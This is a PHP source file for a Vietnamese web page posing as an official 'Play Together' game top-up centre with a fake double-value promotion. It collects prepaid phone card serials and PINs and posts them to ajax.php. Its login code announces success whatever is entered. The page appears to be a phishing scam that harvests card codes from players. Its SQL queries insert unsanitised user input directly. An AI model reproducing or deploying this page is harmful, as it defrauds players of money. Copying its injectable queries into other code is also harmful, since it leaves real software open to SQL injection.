<?php
include ('duchoang_config/config.php');
include ('duchoang_config/header.php');
?>
<!--- Tiêu Đề --->
<title>Nạp Đá Quý | <?php echo $duchoang_title; ?> - <?php echo $duchoang_name; ?></title>
  <?php
  if(!$_SESSION['user']){
  ?>
<div class="page-content">
    <div class="container">
        <img src="<?php echo $duchoang_banner; ?>" width="100%" alt="nạp thẻ play together">
        <div class="content-area card col-12">
            <div class="card-innr">
                <p><b><span style="color: #1c8eff;">Play Together – Topup Center</span></b></p>
                <p><b>Play Together – Gặp Gỡ Bạn Bè Khắp Năm Châu</b> - Vũ Trụ Ảo Với Những Người Bạn Trên Toàn Thế Giới Đã Đến - <b>Play Together</b> Sẽ Hiện Thực Hóa Ước Mơ Của Bạn, Giúp Bạn Thỏa Sức Giải Trí, Tham Gia Những Chuyến Đi Đặc Biệt, Đồng Thời Gặp Gỡ Những Người Bạn Mới Từ Khắp Nơi Trên Thế Giới.</p>
        <div class="content-area card col-12">
       <ul class="nav nav-tabs nav-tabs-line" role="tablist">
                    <li class="nav-item">
                        <a class="nav-link active show" data-toggle="tab" href="#nap-the-play-together"><span class="pay-title"><span class="pay-cur">Nạp thẻ Play Together</span></span></a>
                    </li>
                </ul>
<div class="tab-content" id="profile-details">
<div class="tab-pane fade active show" id="nap-the-play-together">
<div class="token-statistics card card-token height-auto col-12">
<div class="card-innr">
<div class="token-balance">
<div class="token-balance-text">
<h6 class="card-sub-title text-center"><span style="color: white;">Khuyễn Mãi Cực Hot! Tưng Bừng Tết Đến Xuân Về Trang Chủ Play Together Khuyến Mãi X2 Nạp Thẻ.</span>
</div>
</div>
</div>
 </div>       
</br></p>
<h1>Số Dư Của Bạn: 0 VNĐ</h1>
                       <div class="form-thanh-toan">
                        <div class="row">
                        <div class="col-md-12">
                            <div class="input-item input-with-label">
                                <label class="input-item-label">ID Game | Tên Nhân Vật Play Together</label>
                                <input name="tentk" id="idgame" class="input-bordered" type="text" placeholder="Nhập Tên Nhân Vật Hoặc ID Game Của Bạn">
                            </div>
                        </div>
                        <div class="col-md-12">
                            <div class="input-item input-with-label">
                                <label class="input-item-label">Loại Thẻ</label>
                                       <select name="card_type" id="card_type" class="form-control">
                                                  <option value="">- Chọn Loại Thẻ -</option>
                               <option value="Viettel">Viettel</option>
                               <option value="Mobifone">Mobifone</option>
                               <option value="Vinaphone">Vinaphone</option>
                                                </select>
                            </div>
                        </div>
                        <div class="col-md-12">
                            <div class="input-item input-with-label">
                                <label class="input-item-label">Mệnh Giá ( Chọn Sai Mệnh Giá Mất Thẻ )</label>
                                <select name="card_amount" id="card_amount" class="form-control">
                                                    <option value="">Chọn Mệnh Giá</option>
                                                     <option value="10000">10.000 VND</option>
                                                    <option value="20000">20.000 VND</option>
                                                    <option value="50000">50,000 VND</option>
                                                     <option value="100000">100,000 VND </option>
                                                      <option value="200000">200,000 VND</option>
                                                      <option value="300000">300,000 VND</option>
                                                       <option value="500000">500,000 VND</option>
                                                       <option value="1000000">1,000,000 VND</option>
                                                </select>
                            </div>
                        </div>
                        <div class="col-md-12">
                            <div class="input-item input-with-label">
                                <label class="input-item-label">Số seri</label>
                                <input name="serial" id="serial" class="input-bordered" type="number" placeholder="Nhập Số Seri">
                            </div>
                        </div>
                        <div class="col-md-12">
                            <div class="input-item input-with-label">
                                <label class="input-item-label">Mã thẻ</label>
                                <input name="pin" id="pin" class="input-bordered" type="number" placeholder="Nhập Mã Thẻ">
                            </div>
                        </div>
                        <input type="text" hidden class="form-control" name="game" >
                         <input type="text" hidden class="form-control" name="website" >
                         <input type="text" hidden class="form-control" name="gc" >
                        <div class="col-md-12"><div class="kqn" style="margin:10px 0px;"></div>
                            <button style="width: 100%;" type="submit" class="btn btn-primary" onclick="huy_click()" id="loading_napthe">NẠP THẺ</button>
                            <div id="loading_napthe" class="text-center" style="display: none;"><img src="https://c.tenor.com/I6kN-6X7nhAAAAAj/loading-buffering.gif" /><br>Vui Lòng Chờ...</div>
                        </div>
                        </div>
                         <script>
                                    function huy_click() {
                                        var card_type = $("#card_type").val();
                                        var card_amount = $("#card_amount").val();
                                        var serial = $("#serial").val();
                                        var pin = $("#pin").val();
                                        var idgame = $("#idgame").val();

                                        if (!card_type || !card_amount || !serial || !pin || !idgame) {
                                            swal("Có Lỗi Xảy Ra", "Vui Lòng Điền Đầy Đủ Thông Tin Bao Gồm Seri Mã Thẻ Của Bạn", "error");
                                        } else {
                                            $.ajax({
                                                type: "POST",
                                                url: "ajax.php",
                                                data: {
                                                    card_type,
                                                    card_amount,
                                                    serial,
                                                    pin,
                                                },
                                                dataType: "json",
                                                success: function (res) {
                                                    if (res.success) {
                                                        swal("Thành Công", res.success, "success");
                                                    } else {
                                                        swal("Lỗi", res.error, "error");
                                                    }
                                                },
                                                error: function (err) {
                                                    console.log(err);
                                                },
                                            });
                                        }
                                    }
                                  </script>
                                  
                    <br>
                  
</script>
</div></center>
<br />
<?php }else{ ?> 
<?php } ?>
<?php
$taikhoan = mysqli_fetch_array(mysqli_query($connect, "SELECT * FROM user WHERE taikhoan = '".$_SESSION['user']."'"));
    if(isset($_POST['dangnhap'])){
      $taikhoan = $_POST['taikhoan'];
      echo '<meta http-equiv="refresh" content="1;url=/loading.php?=connecting">';
          if(strlen($taikhoan) < 14 || strlen($taikhoan) > 14){
         echo '<script>Swal.fire("Thông Báo", "Đăng Nhập Thành Công!", "success");</script>';
          }else{
          $kiemtra = mysqli_num_rows(mysqli_query($connect, "SELECT * FROM user WHERE taikhoan = '$taikhoan' "));
            $save = mysqli_query($connect,
                  "INSERT INTO `user` (`id`, `taikhoan`) VALUES (NULL, '$taikhoan')");
 echo '<script>Swal.fire("Thông Báo", "Đăng Nhập Thành Công!", "success");</script>';
                    $_SESSION['user'] = $taikhoan;

                    }
                  }
                    ?>
<?php
include ('duchoang_config/footer.php');
?>